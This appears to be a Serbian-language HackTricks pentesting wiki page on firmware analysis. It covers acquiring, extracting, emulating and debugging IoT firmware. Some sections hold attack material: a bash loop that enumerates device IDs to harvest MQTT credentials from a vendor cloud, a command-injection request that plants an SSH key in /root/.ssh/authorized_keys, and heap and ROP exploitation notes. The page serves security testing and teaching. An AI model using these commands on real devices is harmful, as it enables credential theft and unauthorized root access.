# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je ključni softver koji omogućava uređajima da ispravno rade tako što upravlja komunikacijom između hardverskih komponenti i softvera sa kojim korisnici komuniciraju i omogućava je. Čuva se u trajnoj memoriji, što uređaju omogućava da pristupi ključnim instrukcijama čim se uključi, čime se pokreće operativni sistem. Ispitivanje i potencijalna izmena firmvera predstavljaju ključan korak u pronalaženju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključan početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Rasporedu hardvera i tehničkim specifikacijama
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Dijagramima arhitekture i tokova
- Bezbednosnim procenama i otkrivenim ranjivostima

U tu svrhu su alati za **open-source intelligence (OSINT)** izuzetno korisni, kao i analiza svih dostupnih open-source softverskih komponenti putem ručnih i automatizovanih pregleda. Alati poput [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu kojom se mogu pronaći potencijalni problemi.

## **Nabavljanje firmvera**

Firmver se može nabaviti na više načina, a svaki od njih ima različit nivo složenosti:

- Nabavljanje **direktno** od izvora (programera, proizvođača)
- **Izrada** prema priloženim uputstvima
- **Preuzimanje** sa zvaničnih sajtova za podršku
- Korišćenje upita **Google dork** za pronalaženje hostovanih datoteka firmvera
- Direktan pristup **cloud storage-u**, pomoću alata poput [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanje **ažuriranja** pomoću man-in-the-middle tehnika
- **Izdvajanje** sa uređaja putem veza kao što su **UART**, **JTAG** ili **PICit**
- **Prisluškivanje** zahteva za ažuriranje u komunikaciji uređaja
- Pronalaženje i korišćenje **hardcoded endpoint-a za ažuriranje**
- **Dump-ovanje** iz bootloader-a ili mreže
- **Uklanjanje i čitanje** memorijskog čipa, ako ništa drugo ne uspe, pomoću odgovarajuće hardverske opreme

### Samo UART logovi: forsiranje root shell-a preko U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete da forsirate init shell tako što ćete **izmeniti U-Boot environment blob** van uređaja:<sup>[[6]](#references)</sup>

1. Dump-ujte SPI flash pomoću SOIC-8 klipse i programatora (3.3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na ugrađenim uređajima kod kojih je shell bootloader-a onemogućen, ali je env particija upisiva putem spoljnog pristupa flash memoriji.

## Analiza firmvera

Sada kada **imate firmver**, potrebno je da izdvojite informacije o njemu kako biste znali kako da ga obradite. Evo različitih alata koje možete koristiti:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađeš mnogo toga, proveri **entropiju** slike pomoću `binwalk -E <bin>`. Ako je entropija niska, slika verovatno nije šifrovana. Ako je entropija visoka, verovatno je šifrovana (ili komprimovana na neki način).

Pored toga, pomoću ovih alata možeš da izdvojiš **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili možeš da koristiš [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da pregledaš datoteku.

### Dobavljanje fajl sistema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo je da uspeš da **izdvojiš fajl sistem**.\
Binwalk ga obično izdvaja u **fasciklu nazvanu prema tipu fajl sistema**, a to je najčešće jedan od sledećih tipova: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl sistema

Ponekad binwalk u svojim potpisima **nema magični bajt fajl sistema**. U tim slučajevima, koristi binwalk da **pronađeš pomeraj fajl sistema i izdvojiš komprimovani fajl sistem** iz binarne datoteke, a zatim ga **ručno izdvojiš** prema njegovom tipu, prateći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za carving Squashfs fajl-sistema.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u primeru iznad)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 sisteme datoteka

`$ jefferson rootfsfile.jffs2`

- Za ubifs sisteme datoteka sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware-a

Kada se firmware pribavi, neophodno je detaljno ga analizirati kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.

### Alati za početnu analizu

U nastavku je naveden skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i sistemu datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenilo stanje enkripcije slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi poput dokumentacije **file-data-carving-recovery-tools** i alata **binvis.io** za pregled datoteka.

### Izdvajanje datotečnog sistema

Pomoću `binwalk -ev <bin>` obično je moguće izdvojiti datotečni sistem, često u direktorijum nazvan po tipu datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip datotečnog sistema zbog nedostajućih magic bytes, potrebno je ručno izdvajanje. To podrazumeva korišćenje alata `binwalk` za pronalaženje pomeraja datotečnog sistema, a zatim komande `dd` za izdvajanje datotečnog sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa fajl sistema (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza fajl sistema

Kada se fajl sistem izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se posvećuje nebezbednim mrežnim daemonima, hardkodovanim akreditivima, API endpoint-ima, funkcionalnostima servera za ažuriranje, nekompajliranom kodu, skriptama za pokretanje i kompajliranim binarnim datotekama koje se analiziraju van mreže.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** radi pronalaženja korisničkih akreditiva
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne datoteke zbog mogućih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene veb servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u pronalaženju osetljivih informacija i ranjivosti u fajl sistemu:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

I izvorni kod i kompajlirane binarne datoteke pronađene u fajl sistemu moraju se pažljivo pregledati zbog ranjivosti. Alati kao što su **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u otkrivanju nezaštićenih binarnih datoteka koje bi mogle biti iskorišćene.

## Prikupljanje cloud konfiguracije i MQTT akreditiva putem izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-ja uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen je kao heksadecimalni zapis velikim slovima

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT akreditive u otvorenom tekstu i prefikse tema.

Praktični postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a konfiguracije u oblaku i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavi STATIC_KEY i algoritam tokena iz firmware-a

- Učitaj binarne fajlove u Ghidra/radare2 i potraži putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdi algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izračunaj token u Bash-u i pretvori digest u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT akreditive

- Sastavite URL i preuzmite JSON pomoću curl-a; obradite ga pomoću jq-a da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotreba nešifrovanog MQTT-a i slabih ACL-ova za teme (ako postoje)

- Koristite pronađene akreditive da biste se pretplatili na teme za održavanje i tražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Nabrojte predvidljive ID-jeve uređaja (u velikom obimu, uz ovlašćenje)

- Mnogi ekosistemi ugrađuju bajtove OUI-ja/proizvoda/tipa dobavljača, iza kojih sledi sekvencijalni sufiks.
- Možete programski prolaziti kroz moguće ID-jeve, izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Beleške
- Uvek pribavite izričito odobrenje pre pokušaja masovne enumeration.
- Kad god je moguće, prednost dajte emulaciji ili statičkoj analizi radi pribavljanja tajni bez menjanja ciljnog hardvera.


Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prenos root filesystem-a ili određenih binarnih datoteka na uređaj odgovarajuće arhitekture i endianness-a, kao što je Raspberry Pi, ili na unapred pripremljenu virtuelnu mašinu, može olakšati dalje testiranje.

### Emulacija pojedinačnih binarnih datoteka

Za ispitivanje pojedinačnih programa ključno je utvrditi endianness i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se koristiti komanda:

```bash
file ./squashfs-root/bin/busybox
```

I za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za little-endian binarne datoteke koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, a za emulaciju se koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmvera, automatizuju postupak i pomažu u dinamičkoj analizi.

### Rekonstrukcija podeljenih i verifikovanih root sistema datoteka za emulaciju

Ako je superblok sistema datoteka SquashFS čitljiv, ali su pomeraji inode-a, direktorijuma ili tabele fragmenata nemogući, nemojte odmah menjati `unsquashfs`. Obrnutim inženjeringom analizirajte ranu boot binarnu datoteku i reprodukujte graf blok uređaja koji ona kreira: ugrađeni sistemi mogu izložiti nominalnu root particiju, a zatim izgraditi stvarni sistem datoteka pomoću preslikavanja `dm-linear` koje dodaje sektore pozajmljene iz druge particije. Provere koje se oslanjaju samo na superblok mogu uspeti čak i kada su svi naredni blokovi metapodataka pomereni.<sup>[[9]](#references)</sup>

Sačuvajte aritmetiku firmvera tačno. Posebno utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja bitova i odsecanje originalnim redosledom; i uzmite u obzir završne oblasti koje zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre odseca vrednost na granicu od 4 KiB, a tek onda izražava rezultat u sektorima od 512 bajtova; zamena izrazom `partition_bytes // 512` može pomeriti dodati opseg za nekoliko kilobajta i oštetiti sve naredne SquashFS tabele.<sup>[[9]](#references)</sup>

Koristan postupak validacije je:<sup>[[9]](#references)</sup>

1. Iz binarne datoteke verifier/init utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Konkatenirajte ili preslikajte opsege bez menjanja pravila poravnanja.
3. Ako izdvajanje i dalje ne uspe, pretražite samo mali opseg oko predviđene granice i zahtevajte nekoliko uzastopnih validnih struktura metapodataka, umesto da prihvatite samo prividno ispravan superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešno prolazenje kroz sve direktorijume i fragmente predstavlja jači dokaz nego `unsquashfs -stat`.

#### Zamena dm-verity koju kontroliše analitičar

Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može se pokrenuti zamenom proizvođačevog PID 1 za verifikaciju malim statički povezanim programom init. Ovo je **zamena boot lanca u laboratorijskom okruženju**, a ne zaobilaženje dm-verity, njegovog RSA potpisa, Secure Boot-a ili ključa zapečaćenog TPM-om.<sup>[[9]](#references)</sup>

Zamenski init treba da preslika operativne delove originalnog boot postupka: montira `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima datoteka 0–2, montira `/proc` i `/sys`, sačeka zadati blok uređaj, montira izmenjeni root samo za čitanje, odvoji pseudo-sisteme datoteka starog root-a, premesti novi mount na `/`, pozove `chroot` i izvrši `execve()` nad originalnim firmverovim `/sbin/init`. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[9]](#references)</sup>

Držite promenljivo stanje uređaja odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtuelni disk virtio, montiran samo za čitanje, obezbeđuje izmenjeni SquashFS:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Otklanjanje grešaka u stanju offline image-a

Pregledajte trajno stanje van gostujućeg sistema kada sporo pokretanje, destruktivne skripte pri pokretanju ili nepouzdano beleženje konzole otežavaju utvrđivanje uzroka greške. Nikada ne povezujte overlay koji koristi pokrenuta VM; izložite ga pomoću `qemu-nbd`, ograničite LVM otkrivanje na predviđenu NBD particiju i deaktivirajte grupu volumena pre nego što je isključite.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Za ponovljivu izolaciju kvarova, upisujte vremenski označene marker datoteke na stabilan volumen sa mogućnošću upisa i proverite ih van uređaja; `/dev/kmsg`, FIFO-ovi i prolazne konzole mogu dati lažno negativne rezultate zbog ograničavanja brzine ili prevremenog prekida procesa. Takođe uporedite tačne interfejse između slojeva pre nego što menjate nepovezan kod: `uname -r` naspram `/lib/modules/`, funkcije ext4 sistema datoteka na disku naspram konfiguracije kernela i generaciju Mesa `libGL` biblioteke naspram DRI ABI-ja drajvera i naziva drajvera izvedenih iz PCI podataka. Komponenta može postojati, pa čak i uspešno izvršiti `dlopen()`, a da i dalje bude neupotrebljiva jer njen potrošač očekuje drugačiji ABI.<sup>[[9]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi ili stvarno ili emulirano okruženje uređaja. Neophodno je održavati pristup shell-u operativnog sistema i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, zbog čega će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati sistem datoteka, iskoristi izložene veb-stranice i mrežne servise i istraži ranjivosti bootloader-a. Testovi integriteta firmware-a su ključni za otkrivanje potencijalnih backdoor ranjivosti.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz upotrebu alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoints i otkrivanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za ugrađene sisteme bez potpunog debugger-a, **kopirajte statički linkovan `gdbserver`** na uređaj i povežite se sa njim na daljinu:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee / radio-co-processor poruka

Na IoT hubovima, RF stek je često podeljen između **radio MCU-a** i Linux korisničkog procesa. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF frame** u vazduhu
2. **parser na strani kontrolera** na radio MCU-u
3. **tekstualni ili TLV protokol preko serijske veze/UART-a** prosleđen Linuxu (na primer `/dev/tty*`)
4. **dispečer aplikacije** u glavnom daemon-u
5. **rukovalac specifičan za protokol / mašina stanja**

Ova arhitektura nudi dve mete za reverse engineering umesto jedne. Ako kontroler pretvara binarne radio frame-ove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i tabele dispečera
- Koje poruke mogu stići sa **mreže**, a koje od samog kontrolera
- Tačna **polja za razlikovanje specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji rukovaoci su dostupni samo tokom faza **commissioning**, otkrivanja ili preuzimanja firmware-a/modela

Konkretno za Zigbee, uhvatite pairing saobraćaj i proverite da li se meta i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanjem commissioning saobraćaja možete otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista zahteva.

### Rukovaoci protokola specifični za proizvođača i dostupnost kontrolisana FSM-om

Zigbee/ZCL komande specifične za proizvođača često su bolja meta od standardizovanih klastera jer vode do **prilagođenog koda za parsiranje** i internih **FSM-ova** sa manje proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Obrnuto analizirajte dispečer komandi dok ne pronađete **rukovalac dostupan samo proizvođaču**.
- Rekonstruišite tabele **FSM stanja**, **događaja**, **provera**, **akcija** i **sledećeg stanja**.
- Identifikujte **prelazna stanja** koja automatski napreduju, kao i grane ponovnih pokušaja/grešaka koje na kraju resetuju ili oslobađaju memoriju koju kontroliše napadač.
- Proverite koje su legitimne razmene protokola potrebne da bi se daemon doveo u ranjivo stanje, umesto da pretpostavite da je ranjivi rukovalac uvek dostupan.

Kod vremenski osetljivih protokola, reprodukcija paketa iz Python okruženja može biti prespora. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) uz stek namenjen proizvođačima, kako bi se izložili ispravni **endpoint-i**, **atributi** i vremenski uslovi za commissioning.

### Klasa grešaka u fragmentiranim preuzimanjima u ugrađenim daemon-ima

Česta klasa grešaka firmware-a javlja se u **fragmentiranim preuzimanjima blob/model/konfiguracija**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) upisuje `ctx->total_size` i alocira `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo lokalna polja paketa pod kontrolom napadača, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere da li je veličina unutar **prvobitno alociranog prostora**.

Napadač tako može da pošalje:

- Prvi ispravan fragment sa **malom** deklarisanom ukupnom veličinom, čime se forsira mala alokacija na heap-u.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu lokalnu veličinu paketa koja prolazi nove provere, ali i dalje izaziva prekoračenje prvobitno alociranog bafera.

Kada je ranjiva putanja iza commissioning logike, exploit mora da uključi dovoljno **emulacije uređaja** da bi meta pre slanja neispravnih fragmenata dospela u očekivano stanje preuzimanja modela ili blob-a.

### Protokolom izazvani `free()` okidači

U ugrađenim daemon-ima najlakši način da se izazove eksploatacija metapodataka heap-a često nije „čekanje na čišćenje“, već **forsiranje sopstvene obrade grešaka protokола**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente da dovedete FSM u stanja **ponovnog pokušaja** ili **greške**.
- Pređite prag ponovnih pokušaja, tako da daemon **resetuje kontekst** i oslobodi oštećeni bafer.
- Iskoristite ovaj predvidljiv `free()` da pokrenete primitivne operacije allocator-a pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv **musl/uClibc/dlmalloc-sličnih** allocator-a u ugrađenom Linuxu, gde oštećenje metapodataka chunk-a može pretvoriti unlink/unbin logiku u primitivnu operaciju upisa. Stabilan obrazac je da se ošteti **polje veličine** kako bi se preusmerilo kretanje allocator-a kroz **lažne chunk-ove postavljene unutar bafera sa prekoračenjem**, umesto da se odmah pregaze pokazivači stvarnih bin-ova i sruši proces.

## Binary Exploitation i Proof-of-Concept

Izrada PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture mete i programiranje u jezicima nižeg nivoa. Zaštite binarnog okruženja za izvršavanje retke su u ugrađenim sistemima, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).

### Beleške o uClibc fastbin eksploataciji (ugrađeni Linux)

- **Fastbin-ovi + konsolidacija:** uClibc koristi fastbin-ove slične onima u glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, pa svaki lažni chunk mora proći provere (razumna veličina, `fd = 0` i okolni chunk-ovi se smatraju „zauzetim“).<sup>[[6]](#references)</sup>
- **Binarni fajlovi koji nisu PIE pod ASLR-om:** ako je ASLR uključen, ali glavni binarni fajl **nije PIE**, adrese u `.data/.bss` unutar binarnog fajla su stabilne. Možete ciljati oblast koja već liči na ispravno zaglavlje heap chunk-a kako biste alokaciju fastbin-a usmerili na **tabelu pokazivača funkcija**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u payload-u može zaustaviti parsiranje, a istovremeno sačuvati završne bajtove pod kontrolom napadača za stack pivot/ROP lanac.
- **Shellcode preko `/proc/self/mem`:** ROP lanac koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti izvršivi shellcode u poznato mapiranje i preći na njegovo izvršavanje.

## Pripremljeni operativni sistemi za analizu firmware-a

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju unapred konfigurisana okruženja za testiranje bezbednosti firmware-a, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena proceni bezbednosti i penetration testing-u IoT uređaja. Štedi vam mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti ugrađenih sistema, zasnovan na Ubuntu 18.04 i unapred opremljen alatima za testiranje bezbednosti firmware-a.

## Napadi vraćanjem firmware-a na stariju verziju i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač implementira proveru kriptografskog potpisa firmware image-a, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Kada boot ili recovery loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne proverava *verziju* (ili monotoni brojač) image-a koji se instalira, napadač može legitimno da instalira **stariji, ranjivi firmware sa važećim potpisom** i tako ponovo uvede ranjivosti koje su već zakrpljene.<sup>[[4]](#references)</sup>

Uobičajen tok napada:

1. **Nabavite stariji potpisani image**
   * Preuzmite ga sa javnog portala proizvođača, CDN-a ili stranice za podršku.
   * Izdvojite ga iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Preuzmite ga iz repozitorijuma trećih strana kao što su VirusTotal, internet arhive, forumi itd.
2. **Otpremite image na uređaj ili ga učinite dostupnim uređaju** preko bilo kog izloženog kanala za ažuriranje:
   * Web UI, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi potrošački IoT uređaji izlažu *neautentifikovane* HTTP(S) endpoint-e koji prihvataju firmware blob-ove kodirane u Base64 formatu, dekodiraju ih na strani servera i pokreću recovery/nadogradnju.
3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer, filter za command injection koji je dodat kasnije).
4. Opciono, ponovo instalirajte najnoviji image ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon uspostavljanja persistence-a.

### Primer: Command Injection nakon downgrade-a

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom (downgrade-ovanom) firmware-u, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde — omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali zbog odsustva zaštite od downgrade-a ta ispravka nema efekta.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači u svoje prateće mobilne aplikacije uključuju kompletne firmware slike kako bi aplikacija mogla da ažurira uređaj putem Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati poput `apktool`, `ghidra` ili čak običnog `unzip` omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom uređaju.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
